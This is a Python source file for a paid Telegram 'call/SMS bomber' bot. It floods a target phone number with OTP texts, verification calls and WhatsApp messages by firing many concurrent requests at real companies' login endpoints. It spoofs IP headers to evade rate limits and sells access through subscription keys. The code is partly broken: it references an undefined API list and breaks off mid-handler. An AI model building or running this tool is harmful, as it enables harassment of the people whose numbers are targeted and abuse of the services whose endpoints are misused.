#!/usr/bin/env python3
"""
🔥 CollBomber Telegram Bot — Ultra Fast Mode (Enhanced)
Package: com.rolex.mybasic.collbomber
100+ APIs | Call + SMS + WhatsApp + Mix | Multi-threaded
"""

import telebot
from telebot import types
import requests
import threading
import time
import random
import uuid
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import json
from collections import defaultdict
import hashlib
import os

# ============================================================
# CONFIG — Bot Token + Speed Settings
# ============================================================
API_TOKEN = os.environ.get("BOT_TOKEN", "8637970739:AAHLlnBj_SPc9Dm-QJKTNH7ed23o4jI2WGw")
if not API_TOKEN:
    try:
        from config_token import TOKEN as API_TOKEN
    except ImportError:
        API_TOKEN = "8637970739:AAHLlnBj_SPc9Dm-QJKTNH7ed23o4jI2WGw"

MAX_WORKERS = 25
SMS_MAX_WORKERS = 40
DELAY_BETWEEN_ROUNDS = 0.5
SMS_DELAY_BETWEEN_ROUNDS = 0.2
SMS_DOUBLE_FIRE = False
SMS_AUTO_RETRY = True

IMPORTANT_CALL_INTERVAL = 5
IMPORTANT_5S_INTERVAL = 5

# ============================================================
# ADMIN CONFIG
# ============================================================
ADMIN_IDS = [8884156794]
ADMIN_DB_PATH = "admin_db.json"

# ============================================================
# CHANNEL CONFIG
# ============================================================
REQUIRED_CHANNEL = "@+9aocnTYDoHs0ODg9"
CHANNEL_LINK = "https://t.me/+9aocnTYDoHs0ODg9"
WELCOME_IMAGE = "https://kommodo.ai/i/ST2iIgoO4nHTuLsSdAGX"

bot = telebot.TeleBot(API_TOKEN)

# ============================================================
# ADMIN DATABASE
# ============================================================
class AdminDB:
    def __init__(self, db_path=ADMIN_DB_PATH):
        self.db_path = db_path
        self.lock = threading.Lock()
        self.data = self._load()

    def _load(self):
        try:
            with open(self.db_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {
                "users": {},
                "banned": [],
                "admins": [],
                "broadcasts": 0,
                "total_bombs": 0,
                "verified": [],
                "keys": {},
                "subscriptions": {},
                "trials": {},
                "api_stats": {},
                "premium_users": []
            }

    def _save(self):
        with open(self.db_path, "w") as f:
            json.dump(self.data, f, indent=2)

    def track_user(self, user_id, username, phone, mode):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["users"]:
                self.data["users"][uid] = {
                    "username": username or "Unknown",
                    "first_seen": datetime.now().isoformat(),
                    "phone": phone,
                    "total_sessions": 0,
                    "total_hits": 0,
                    "total_ok": 0,
                    "total_fail": 0,
                    "total_rounds": 0,
                    "modes_used": [],
                    "last_active": datetime.now().isoformat(),
                    "last_phone": phone,
                    "last_mode": mode
                }
            u = self.data["users"][uid]
            u["last_active"] = datetime.now().isoformat()
            u["last_phone"] = phone
            u["last_mode"] = mode
            u["total_sessions"] += 1
            if mode not in u["modes_used"]:
                u["modes_used"].append(mode)
            u["username"] = username or u["username"]
            self._save()

    def update_stats(self, user_id, ok, fail, rounds, total):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["users"]:
                u = self.data["users"][uid]
                u["total_hits"] += total
                u["total_ok"] += ok
                u["total_fail"] += fail
                u["total_rounds"] += rounds
                u["last_active"] = datetime.now().isoformat()
                self.data["total_bombs"] += total
                self._save()

    def is_banned(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("banned", [])

    def is_admin(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("admins", []) or user_id in ADMIN_IDS

    def ban_user(self, user_id, admin_id):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["banned"]:
                self.data["banned"].append(uid)
                self.data.setdefault("ban_log", []).append({
                    "user_id": uid,
                    "admin_id": admin_id,
                    "action": "ban",
                    "time": datetime.now().isoformat()
                })
                self._save()
                return True
            return False

    def unban_user(self, user_id, admin_id):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["banned"]:
                self.data["banned"].remove(uid)
                self.data.setdefault("ban_log", []).append({
                    "user_id": uid,
                    "admin_id": admin_id,
                    "action": "unban",
                    "time": datetime.now().isoformat()
                })
                self._save()
                return True
            return False

    def add_admin(self, user_id, added_by):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data["admins"]:
                self.data["admins"].append(uid)
                self._save()
                return True
            return False

    def remove_admin(self, user_id):
        with self.lock:
            uid = str(user_id)
            if uid in self.data["admins"]:
                self.data["admins"].remove(uid)
                self._save()
                return True
            return False

    def get_all_users(self):
        with self.lock:
            return dict(self.data["users"])

    def get_user_count(self):
        with self.lock:
            return len(self.data["users"])

    def get_banned_count(self):
        with self.lock:
            return len(self.data.get("banned", []))

    def get_total_bombs(self):
        with self.lock:
            return self.data.get("total_bombs", 0)

    def verify_user(self, user_id):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data.get("verified", []):
                self.data.setdefault("verified", []).append(uid)
                self._save()
                return True
            return False

    def is_verified(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("verified", [])

    def start_trial(self, user_id):
        with self.lock:
            uid = str(user_id)
            trials = self.data.setdefault("trials", {})
            if uid in trials:
                return False, "❌ Aap already trial le chuke hain!"
            now = datetime.now()
            expires = (now + timedelta(days=30)).isoformat()
            trials[uid] = {
                "started_at": now.isoformat(),
                "expires_at": expires,
                "plan": "trial"
            }
            subs = self.data.setdefault("subscriptions", {})
            subs[uid] = {
                "plan": "trial",
                "started_at": now.isoformat(),
                "expires_at": expires,
                "max_concurrent": 2,
                "max_hours": 4,
                "price": 0
            }
            self._save()
            return True, f"✅ *Trial Activated!*\n\n🎯 Plan: 30 Day Free Trial\n⚡ Concurrent: 2\n⏰ Max Hours: 4h\n📅 Expires: {expires[:10]}"

    def has_trial(self, user_id):
        with self.lock:
            return str(user_id) in self.data.get("trials", {})

    def generate_key(self, plan, created_by, custom_days=None):
        with self.lock:
            self.data.setdefault("keys", {})
            self.data.setdefault("subscriptions", {})

            raw = f"{plan}_{uuid.uuid4().hex}_{time.time()}_{random.randint(1000,9999)}"
            key = hashlib.md5(raw.encode()).hexdigest()[:16].upper()
            key = "-".join([key[i:i+4] for i in range(0, 16, 4)])

            plan_config = {
                "daily": {"days": 1, "concurrent": 2, "hours": 2, "price": 40},
                "monthly": {"days": 30, "concurrent": 2, "hours": 8, "price": 199},
                "3month": {"days": 90, "concurrent": 3, "hours": 24, "price": 499},
                "custom": {"days": custom_days or 30, "concurrent": 5, "hours": 24, "price": 0},
            }

            if custom_days and plan == "custom":
                cfg = plan_config["custom"]
                cfg["days"] = custom_days
            else:
                cfg = plan_config.get(plan, plan_config["monthly"])

            self.data["keys"][key] = {
                "plan": plan,
                "days": cfg["days"],
                "concurrent": cfg["concurrent"],
                "max_hours": cfg["hours"],
                "price": cfg["price"],
                "created_by": created_by,
                "created_at": datetime.now().isoformat(),
                "used": False,
                "used_by": None,
                "used_at": None,
                "expires_at": None
            }
            self._save()
            return key

    def redeem_key(self, key, user_id):
        with self.lock:
            self.data.setdefault("keys", {})
            self.data.setdefault("subscriptions", {})
            uid = str(user_id)

            if key not in self.data["keys"]:
                return False, "❌ Invalid key! Yeh key exist nahi karti."

            k = self.data["keys"][key]
            if k["used"]:
                return False, "❌ Yeh key already used ho chuki hai!"

            now = datetime.now()
            if k["days"] >= 99999:
                expires = (now.replace(year=now.year + 50)).isoformat()
            else:
                expires = (now + timedelta(days=k["days"])).isoformat()

            self.data["subscriptions"][uid] = {
                "plan": k["plan"],
                "started_at": now.isoformat(),
                "expires_at": expires,
                "max_concurrent": k["concurrent"],
                "max_hours": k["max_hours"],
                "price": k["price"],
                "active": True
            }

            if uid not in self.data.get("premium_users", []):
                self.data.setdefault("premium_users", []).append(uid)

            k["used"] = True
            k["used_by"] = uid
            k["used_at"] = now.isoformat()
            self._save()
            return True, (f"✅ *Plan Activated!*\n\n"
                          f"🎯 Plan: {k['plan'].upper()}\n"
                          f"⏱ Duration: {k['days']} days\n"
                          f"⚡ Concurrent: {k['concurrent']}\n"
                          f"⏰ Max Hours: {k['max_hours']}h")

    def get_subscription(self, user_id):
        with self.lock:
            uid = str(user_id)
            sub = self.data.get("subscriptions", {}).get(uid)
            if not sub:
                return None
            if sub.get("expires_at"):
                expires = datetime.fromisoformat(sub["expires_at"])
                if datetime.now() > expires:
                    sub["active"] = False
                    self._save()
                    return None
            return sub

    def get_all_keys(self):
        with self.lock:
            return dict(self.data.get("keys", {}))

    def get_premium_users(self):
        with self.lock:
            return self.data.get("premium_users", [])

    def reset_premium(self, user_id):
        with self.lock:
            uid = str(user_id)
            if uid in self.data.get("premium_users", []):
                self.data["premium_users"].remove(uid)
            if uid in self.data.get("subscriptions", {}):
                del self.data["subscriptions"][uid]
            self._save()
            return True

    def update_api_stats(self, api_name, success):
        with self.lock:
            stats = self.data.setdefault("api_stats", {})
            if api_name not in stats:
                stats[api_name] = {"success": 0, "fail": 0}
            if success:
                stats[api_name]["success"] += 1
            else:
                stats[api_name]["fail"] += 1
            self._save()

    def get_api_stats(self):
        with self.lock:
            return self.data.get("api_stats", {})

admin_db = AdminDB()

# ============================================================
# API CONFIG
# ============================================================
class ApiConfig:
    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms", delay_ms=0):
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
        self.body = body
        self.category = category
        self.delay_ms = delay_ms

    def build_request(self, phone, duration=3):
        ts = str(int(time.time() * 1000))
        rand_id = uuid.uuid4().hex[:8]
        uid = uuid.uuid4().hex
        md5 = uid.replace("-", "")[:32]
        random_pan = random.choice(["ABCDE1234F", "GDODJ5434B", "GSISB5468H", "HSOSN5464B",
                                     "FUOUR2389B", "VUJVU5675H", "TSISV5434B"])

        final_url = self.url
        for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                         ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                         ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
            final_url = final_url.replace(key, val)

        headers = dict(self.headers)
        if "X-Forwarded-For" not in headers and "Client-IP" not in headers:
            spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Forwarded-For"] = spoof
            headers["Client-IP"] = spoof

        body = self.body
        if body:
            for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                             ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                             ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
                body = body.replace(key, val)

        return final_url, headers, body

# ============================================================
# ALL APIs - FIXED VERSION
# ============================================================
def get_all_apis():
    apis = []

    # ====== CALL APIs ======
    call_apis = [
        ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),

        ApiConfig("Hotstar_SMS", "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp&page_enum=onboarding_login", "POST",
                  {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"},
                  '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{phone}"}}'),
    ]
    apis.extend(sms_apis)

    apis.append(ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
                          {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"))

    return apis

ALL_APIS = get_all_apis()

# ============================================================
# Categorized lookups
# ============================================================
CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]

# ============================================================
# IMPORTANT APIS
# ============================================================
IMPORTANT_CALL_APIS = [
    ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
    ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
]

IMPORTANT_5S_APIS = [
    ApiConfig("ThakurBombCyber_5s", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
              {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
]

# ============================================================
# USER DATA STORE
# ============================================================
class UserData:
    def __init__(self):
        self.users = {}

user_data = UserData()
admin_data = {}

# ============================================================
# WORKER
# ============================================================
class UltraBomber:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)
        self.http_session = requests.Session()
        self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=25, max_retries=0))
        self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=25, max_retries=0))

    def _fire_api(self, api, phone):
        try:
            url, headers, body = api.build_request(phone)
            if api.method.upper() == "POST":
                resp = self.http_session.post(url, headers=headers, data=body, timeout=10, allow_redirects=False)
            else:
                resp = self.http_session.get(url, headers=headers, timeout=10, allow_redirects=False)
            status = resp.status_code
            size = len(resp.content)
            success = 200 <= status < 400 and size > 0
            admin_db.update_api_stats(api.name, success)
            return api.name, status, size, success, None
        except Exception as e:
            admin_db.update_api_stats(api.name, False)
            return api.name, 0, 0, False, str(e)[:60]

    def _run_round(self, phone, apis, stats, is_sms=False):
        executor = self.sms_executor if is_sms else self.executor
        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
        
        futures = []
        for api in apis:
            if api.delay_ms > 0:
                time.sleep(api.delay_ms / 1000.0)
            for _ in range(fire_count):
                futures.append(executor.submit(self._fire_api, api, phone))

        ok_count = 0
        fail_count = 0
        failed_apis = []
        for f in as_completed(futures):
            name, status, size, success, err = f.result()
            if success:
                ok_count += 1
            else:
                fail_count += 1
                failed_apis.append(name)
        
        if is_sms and SMS_AUTO_RETRY and failed_apis:
            retry_futures = []
            for api in apis:
                if api.name in failed_apis[:30]:
                    retry_futures.append(executor.submit(self._fire_api, api, phone))
            for f in as_completed(retry_futures):
                name, status, size, success, err = f.result()
                if success:
                    ok_count += 1
                else:
                    fail_count += 1
        
        return ok_count, fail_count

    def _worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
            mode = info["mode"]
            stats = info["stats"]

        if mode == "call":
            apis = CALL_APIS
        elif mode == "whatsapp":
            apis = WHATSAPP_APIS
        elif mode == "sms":
            apis = SMS_APIS
        else:
            apis = ALL_APIS

        round_num = 0
        is_sms_mode = (mode == "sms")
        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
        
        while not stop_event.is_set():
            round_num += 1
            try:
                ok, fail = self._run_round(phone, apis, stats, is_sms=is_sms_mode)
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok
                        self.sessions[chat_id]["stats"]["fail"] += fail
                        self.sessions[chat_id]["stats"]["rounds"] += 1
                        self.sessions[chat_id]["stats"]["total"] += ok + fail

                report_interval = 10 if is_sms_mode else 5
                if round_num % report_interval == 0:
                    with self.lock:
                        s = self.sessions.get(chat_id, {}).get("stats", {})
                        if s:
                            elapsed = (datetime.now() - s["start_time"]).total_seconds()
                            s["elapsed"] = str(datetime.now() - s["start_time"]).split('.')[0]
                    try:
                        total = s.get('total', 0)
                        ok = s.get('ok', 0)
                        pct = (ok / max(total, 1)) * 100
                        bar_len = 30
                        filled = int(bar_len * pct / 100)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        stop_markup = types.InlineKeyboardMarkup()
                        stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                        bot.send_message(chat_id,
                            f"💣 *BOMBING ACTIVE* 💣\n"
                            f"━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💣 Target: `{phone}`\n"
                            f"✅ Hits: {ok}/{total}\n"
                            f"📊 Progress: [{bar}] {pct:.1f}%\n"
                            f"⏱️ Time Elapsed: {s.get('elapsed', '0s')}",
                            parse_mode="Markdown", reply_markup=stop_markup)
                    except:
                        pass
            except Exception as e:
                try:
                    bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}")
                except:
                    pass
            time.sleep(round_delay)

    def _important_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]

        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_CALL_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))

                ok_count = 0
                fail_count = 0
                for f in as_completed(futures):
                    name, status, size, success, err = f.result()
                    if success:
                        ok_count += 1
                    else:
                        fail_count += 1

                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok_count
                        self.sessions[chat_id]["stats"]["fail"] += fail_count
                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
            except:
                pass
            time.sleep(IMPORTANT_CALL_INTERVAL)

    def _important_five_second_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]

        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_5S_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))

                for f in as_completed(futures):
                    name, status, size, success, err = f.result()
                    with self.lock:
                        if chat_id in self.sessions:
                            if success:
                                self.sessions[chat_id]["stats"]["ok"] += 1
                            else:
                                self.sessions[chat_id]["stats"]["fail"] += 1
                            self.sessions[chat_id]["stats"]["total"] += 1
            except:
                pass
            time.sleep(IMPORTANT_5S_INTERVAL)

    def start(self, chat_id, phone, mode, username=None):
        with self.lock:
            if chat_id in self.sessions:
                return False, "Already running! Pehle Stop karein."
            
            if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
                sub = admin_db.get_subscription(chat_id)
                if not sub:
                    return False, "❌ *No Active Plan!*\n\nAapke paas koi active plan nahi hai.\n📋 Plans mein dekh kar key redeem karein ya admin se contact karein."
            
            admin_db.track_user(chat_id, username, phone, mode)
            stop_event = threading.Event()
            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0, "start_time": datetime.now(), "elapsed": "0s"}
            self.sessions[chat_id] = {
                "phone": phone, "mode": mode, "stop_event": stop_event,
                "stats": stats, "thread": None, "imp_thread": None, "imp5s_thread": None,
                "user_id": chat_id, "username": username
            }
            thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
            thread.start()
            self.sessions[chat_id]["thread"] = thread
            if mode in ["call", "mix"]:
                imp_thread = threading.Thread(target=self._important_worker, args=(chat_id, stop_event), daemon=True)
                imp_thread.start()
                self.sessions[chat_id]["imp_thread"] = imp_thread
            imp5s_thread = threading.Thread(target=self._important_five_second_worker, args=(chat_id, stop_event), daemon=True)
            imp5s_thread.start()
            self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
            
            try:
                stop_markup = types.InlineKeyboardMarkup()
                stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                bot.send_message(chat_id,
                    f"💣 *BOMBING ACTIVE* 💣\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💣 Target: `{phone}`\n"
                    f"✅ Hits: 0/0\n"
                    f"📊 Progress: [{'░' * 30}] 0.0%\n"
                    f"⏱️ Time Elapsed: 0s\n"
                    f"🎯 Mode: *{mode.upper()}*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚡ Full attack initiated...",
                    parse_mode="Markdown", reply_markup=stop_markup)
            except:
                pass
            
            return True, f"🔥 *{mode.upper()} started for* `{phone}`"

    def stop(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return False, "❌ Koi active session nahi hai."
            self.sessions[chat_id]["stop_event"].set()
            elapsed = datetime.now() - self.sessions[chat_id]["stats"]["start_time"]
            s = self.sessions[chat_id]["stats"]
            admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
            total = s['total']
            ok = s['ok']
            pct = (ok / max(total, 1)) * 100
            bar_len = 30
            filled = int(bar_len * pct / 100)
            bar = "█" * filled + "░" * (bar_len - filled)
            del self.sessions[chat_id]
            return True, (f"💥 *BOMBING COMPLETE* 💥\n"
                         f"━━━━━━━━━━━━━━━━━━━━━\n"
                         f"✅ Final Hits: {ok}/{total}\n"
                         f"📊 Progress: [{bar}] {pct:.1f}%\n"
                         f"⏱️ Duration: {str(elapsed).split('.')[0]}\n"
                         f"🔄 Total Rounds: {s['rounds']}\n"
                         f"━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🛑 Session terminated. /start for new session!")

    def get_status(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return None
            s = self.sessions[chat_id]
            elapsed = datetime.now() - s["stats"]["start_time"]
            elapsed_str = str(elapsed).split('.')[0]
            s["stats"]["elapsed"] = elapsed_str
            return {
                "phone": s["phone"], "mode": s["mode"],
                "ok": s["stats"]["ok"], "fail": s["stats"]["fail"],
                "rounds": s["stats"]["rounds"], "total": s["stats"]["total"],
                "elapsed": elapsed_str
            }

    def stop_all(self):
        with self.lock:
            ids = list(self.sessions.keys())
            for chat_id in ids:
                s = self.sessions[chat_id]["stats"]
                admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
                self.sessions[chat_id]["stop_event"].set()
            self.sessions.clear()
            return len(ids)

bomber = UltraBomber()

# ============================================================
# CHANNEL CHECK
# ============================================================
def is_channel_member(user_id):
    if user_id in ADMIN_IDS:
        return True
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"⚠️ Channel check failed: {e}")
        return admin_db.is_verified(user_id)

def join_channel_required(func):
    def wrapper(message, *args, **kwargs):
        chat_id = message.chat.id
        if not is_channel_member(chat_id) and chat_id not in ADMIN_IDS:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
            bot.reply_to(message,
                f"⚠️ *Channel Join Required!*\n\n"
                f"Bot use karne ke liye pehle hamare channel ko join karein:\n\n"
                f"👉 {CHANNEL_LINK}\n\n"
                f"Channel join karne ke baad '✅ Joined' button dabayein.",
                parse_mode="Markdown", reply_markup=markup)
            return
        return func(message, *args, **kwargs)
    return wrapper

def subscription_required(func):
    def wrapper(message, *args, **kwargs):
        chat_id = message.chat.id
        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
            sub = admin_db.get_subscription(chat_id)
            if not sub:
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("📋 Plans", callback_data="goto_plans"),
                    types.InlineKeyboardButton("🎁 Redeem", callback_data="goto_redeem"),
                )
                bot.reply_to(message,
                    "🚫 *No Active Subscription!*\n\n"
                    "Aapke paas koi active subscription nahi hai.\n\n"
                    "👉 /plans se subscription kharidein\n"
                    "👉 /redeem se key redeem karein\n\n"
                    "Subscription lene ke baad hi aap bot use kar sakte hain.",
                    parse_mode="Markdown", reply_markup=markup)
                return
        return func(message, *args, **kwargs)
    return wrapper

# ============================================================
# KEYBOARDS
# ============================================================
def main_keyboard(user_id=None):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        types.KeyboardButton("🔥 MIX"),
        types.KeyboardButton("💥 Bulk MIX"),
        types.KeyboardButton("📞 CALL"),
        types.KeyboardButton("📱 WHATSAPP"),
        types.KeyboardButton("💬 SMS"),
        types.KeyboardButton("📊 Status"),
        types.KeyboardButton("👤 Account"),
        types.KeyboardButton("❓ Help"),
        types.KeyboardButton("📋 Plans"),
        types.KeyboardButton("🎁 Redeem"),
        types.KeyboardButton("🎁 Free Trial"),
        types.KeyboardButton("🛑 Stop"),
    ]
    if user_id and (user_id in ADMIN_IDS or admin_db.is_admin(user_id)):
        buttons.append(types.KeyboardButton("⚙️ Admin"))
    markup.add(*buttons)
    return markup

# ============================================================
# BOT HANDLERS
# ============================================================
@bot.message_handler(commands=['start'])
@join_channel_required
def cmd_start(message):
    chat_id = message.chat.id
    user = message.from_user
    name = f"{user.first_name} {user.last_name or ''}".strip()
    name_display = name if name else user.username or "User"

    if admin_db.is_banned(chat_id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    
    welcome_msg = (
        f"🛰️ *SYSTEM GATEWAY* 🛰️\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {name_display} (ID: {chat_id})\n\n"
        f"👋 Welcome to the Bot!\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ *No Active Subscription Detected*\n\n"
        f"You do not have an active plan currently assigned to your account.\n\n"
        f"🎟️ *To Subscribe:*\n"
        f"▫️ Use /plans to view pricing & purchase\n"
        f"▫️ Use /redeem to activate using a code\n\n"
        f"💡 *We are ready when you are!*"
    )
    try:
        bot.send_photo(chat_id, WELCOME_IMAGE, caption=welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
    except:
        bot.send_message(chat_id, welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(commands=['help'])
@join_channel_required
def cmd_help(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    bot.reply_to(message,
        "❓ *Help*\n\n"
        "📞 *Call Only* — Sirf call APIs\n"
        "💬 *SMS Only* — Sirf SMS APIs\n"
        "📱 *WhatsApp Only* — Sirf WhatsApp APIs\n"
        "🔥 *MIX (All)* — Saare APIs ek saath!\n"
        "🛑 *Stop* — Band karein\n"
        "📊 *Status* — Current session ki jankari\n\n"
        "⚡ *25 concurrent workers* (Call/WhatsApp/Mix)\n"
        "⚡ *40 concurrent workers* (SMS Mode) — Double-fire + Auto-retry\n"
        "⚡ *SMS har 200ms mein naya round* — Non-stop barrage!",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "❓ Help")
@join_channel_required
def btn_help(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    cmd_help(message)

@bot.message_handler(func=lambda m: m.text == "📊 Status")
@join_channel_required
@subscription_required
def btn_status(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    status = bomber.get_status(message.chat.id)
    if status:
        total = status['total']
        ok = status['ok']
        pct = (ok / max(total, 1)) * 100
        bar_len = 30
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        bot.reply_to(message,
            f"💣 *BOMBING ACTIVE* 💣\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💣 Target: `{status['phone']}`\n"
            f"🎯 Mode: *{status['mode'].upper()}*\n"
            f"✅ Hits: {ok}/{total}\n"
            f"📊 Progress: [{bar}] {pct:.1f}%\n"
            f"⏱️ Time Elapsed: {status['elapsed']}",
            parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Koi active session nahi hai. /start karein.", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text == "🛑 Stop")
@join_channel_required
def btn_stop(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    success, msg = bomber.stop(message.chat.id)
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text in ["🔥 MIX", "💥 Bulk MIX", "📞 CALL", "📱 WHATSAPP", "💬 SMS"])
@join_channel_required
@subscription_required
def btn_mode(message):
    chat_id = message.chat.id
    if admin_db.is_banned(chat_id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    mode_map = {
        "🔥 MIX": "mix",
        "💥 Bulk MIX": "bulk_mix",
        "📞 CALL": "call",
        "📱 WHATSAPP": "whatsapp",
        "💬 SMS": "sms",
    }
    mode = mode_map[message.text]
    username = message.from_user.username or message.from_user.first_name

    user_data.users.setdefault(chat_id, {})
    phone = user_data.users[chat_id].get("phone")

    if not phone:
        user_data.users[chat_id]["pending_mode"] = mode
        bot.reply_to(message,
            "📱 Pehle phone number bhejo (10-digit):\n\n"
            "Jaise: `9876543210`",
            parse_mode="Markdown")
        return

    if mode == "bulk_mix":
        user_data.users[chat_id]["pending_mode"] = "bulk_mix_confirm"
        bot.reply_to(message,
            "💥 *Bulk MIX Mode*\n\n"
            "3 numbers comma se alag karke bhejo:\n\n"
            "Jaise: `9876543210, 9876543211, 9876543212`",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    success, msg = bomber.start(chat_id, phone, mode, username=username)
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(func=lambda m: m.text == "👤 Account")
@join_channel_required
@subscription_required
def btn_account(message):
    chat_id = message.chat.id
    user = message.from_user
    name = f"{user.first_name} {user.last_name or ''}".strip()
